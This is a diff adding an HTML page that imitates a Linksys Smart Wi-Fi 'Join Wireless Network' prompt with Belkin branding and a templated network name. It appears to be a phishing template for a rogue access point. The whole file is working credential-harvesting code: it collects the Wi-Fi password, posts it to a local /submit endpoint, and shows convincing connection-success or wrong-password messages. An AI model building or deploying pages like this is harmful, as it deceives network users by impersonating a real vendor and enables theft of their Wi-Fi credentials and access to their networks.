@@ -1,0 +1,297 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Linksys Smart Wi-Fi - {{ssid}}</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            background: #f4f4f4;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: white;
+            border-radius: 6px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            max-width: 450px;
+            width: 100%;
+        }
+
+        .header {
+            background: #1c4587;
+            padding: 20px 30px;
+            border-radius: 6px 6px 0 0;
+        }
+
+        .logo {
+            color: white;
+            font-size: 26px;
+            font-weight: 300;
+            letter-spacing: 1px;
+        }
+
+        .logo-bold {
+            font-weight: 700;
+        }
+
+        .content {
+            padding: 30px;
+        }
+
+        .title {
+            font-size: 22px;
+            color: #333;
+            margin-bottom: 8px;
+            font-weight: 300;
+        }
+
+        .subtitle {
+            color: #777;
+            font-size: 14px;
+            margin-bottom: 30px;
+        }
+
+        .info-card {
+            background: #f9f9f9;
+            border: 1px solid #e0e0e0;
+            border-radius: 4px;
+            padding: 18px;
+            margin-bottom: 25px;
+        }
+
+        .info-header {
+            color: #1c4587;
+            font-size: 12px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 8px;
+        }
+
+        .info-content {
+            color: #333;
+            font-size: 17px;
+            font-weight: 500;
+        }
+
+        .form-group {
+            margin-bottom: 22px;
+        }
+
+        label {
+            display: block;
+            color: #555;
+            font-size: 14px;
+            font-weight: 500;
+            margin-bottom: 8px;
+        }
+
+        input[type="password"] {
+            width: 100%;
+            padding: 11px 14px;
+            border: 1px solid #ccc;
+            font-size: 15px;
+            border-radius: 4px;
+            transition: all 0.2s;
+        }
+
+        input[type="password"]:focus {
+            outline: none;
+            border-color: #1c4587;
+            box-shadow: 0 0 0 3px rgba(28, 69, 135, 0.1);
+        }
+
+        button {
+            width: 100%;
+            padding: 13px;
+            background: #1c4587;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+
+        button:hover {
+            background: #163763;
+        }
+
+        button:active {
+            background: #0f2744;
+        }
+
+        button:disabled {
+            background: #9ca3b0;
+            cursor: not-allowed;
+        }
+
+        .error {
+            background: #fee;
+            border: 1px solid #f88;
+            color: #c33;
+            padding: 12px;
+            margin-bottom: 20px;
+            border-radius: 4px;
+            font-size: 14px;
+            display: none;
+        }
+
+        .error.show {
+            display: block;
+        }
+
+        .note {
+            color: #999;
+            font-size: 12px;
+            margin-top: 12px;
+            text-align: center;
+        }
+
+        .footer {
+            background: #fafafa;
+            padding: 18px 30px;
+            border-top: 1px solid #e0e0e0;
+            border-radius: 0 0 6px 6px;
+            text-align: center;
+        }
+
+        .footer-text {
+            color: #999;
+            font-size: 11px;
+        }
+
+        .loading {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 0.7s linear infinite;
+            margin-right: 8px;
+            display: none;
+            vertical-align: middle;
+        }
+
+        button:disabled .loading {
+            display: inline-block;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo">
+                <span>Linksys</span>
+                <span class="logo-bold">Smart Wi-Fi</span>
+            </div>
+        </div>
+
+        <div class="content">
+            <div class="title">Join Wireless Network</div>
+            <div class="subtitle">Enter the network password to connect</div>
+
+            <div class="info-card">
+                <div class="info-header">Network Name</div>
+                <div class="info-content">{{ssid}}</div>
+            </div>
+
+            <div class="error" id="error"></div>
+
+            <form id="loginForm" method="POST" action="/submit">
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <input
+                        type="password"
+                        id="password"
+                        name="password"
+                        required
+                        autocomplete="off"
+                        placeholder="Enter network password"
+                    >
+                </div>
+
+                <button type="submit" id="submitBtn">
+                    <span class="loading"></span>
+                    <span id="buttonText">Join Network</span>
+                </button>
+
+                <div class="note">
+                    Password is case sensitive
+                </div>
+            </form>
+        </div>
+
+        <div class="footer">
+            <div class="footer-text">
+                © 2025 Belkin International, Inc. and/or its affiliates. All rights reserved.
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const form = document.getElementById('loginForm');
+        const submitBtn = document.getElementById('submitBtn');
+        const buttonText = document.getElementById('buttonText');
+        const errorDiv = document.getElementById('error');
+
+        form.addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            submitBtn.disabled = true;
+            buttonText.textContent = 'Connecting...';
+            errorDiv.classList.remove('show');
+
+            const formData = new FormData(form);
+
+            fetch('/submit', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    buttonText.textContent = 'Connected!';
+                    errorDiv.textContent = '✓ Successfully connected to the network';
+                    errorDiv.style.background = '#efe';
+                    errorDiv.style.border = '1px solid #8d8';
+                    errorDiv.style.color = '#363';
+                    errorDiv.classList.add('show');
+
+                    setTimeout(() => {
+                        window.location.href = '/success';
+                    }, 1500);
+                } else {
+                    throw new Error(data.message || 'Connection failed');
+                }
+            })
+            .catch(error => {
+                submitBtn.disabled = false;
+                buttonText.textContent = 'Join Network';
+                errorDiv.textContent = '✗ Incorrect password. Please check and try again.';
+                errorDiv.classList.add('show');
+                document.getElementById('password').value = '';
+                document.getElementById('password').focus();
+            });
+        });
+    </script>
+</body>
+</html>
